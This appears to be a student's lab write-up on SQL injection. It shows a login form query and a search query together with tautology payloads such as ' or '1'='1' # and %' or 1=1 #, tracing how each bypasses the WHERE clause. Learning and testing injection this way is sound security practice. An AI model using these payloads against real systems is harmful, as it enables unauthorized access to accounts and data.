## SQL injection

### Hero form : 
```
select * from heros where username = ''  AND password = ''
```
Solution : we have to pass the sql to be always true
```
username : 'or '1'='1' # 
 ==> select * from heros where username = ''or '1'='1' # '  AND password = '' ==> true
```
Solution 2
```
username: 'or '1'='1
password: 'or '1'='1
select * from heros where username = ''or '1'='1  AND password = ''or '1'='1' ==> false or true and false or true ==> true and true ==> true
```
### GET/search
```
select * from movies where name like  '%%'
```
```
Solution
%'or 1=1 # attention a space 
```
